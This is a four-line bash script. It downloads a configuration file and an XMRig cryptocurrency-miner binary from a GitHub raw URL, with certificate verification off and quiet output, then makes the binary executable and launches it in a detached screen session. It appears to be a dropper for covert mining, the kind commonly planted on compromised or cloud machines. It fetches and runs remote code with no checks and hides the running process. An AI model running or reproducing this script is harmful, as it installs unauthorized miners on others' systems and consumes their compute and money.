#!/bin/bash
wget -N --no-check-certificate -q -O config.json https://raw.githubusercontent.com/gcp5678/config/main/config.json 
wget -N --no-check-certificate -q -O xmrig https://raw.githubusercontent.com/gcp5678/config/main/amdxmrig && chmod 755 xmrig
screen -dmS xmrig ./xmrig

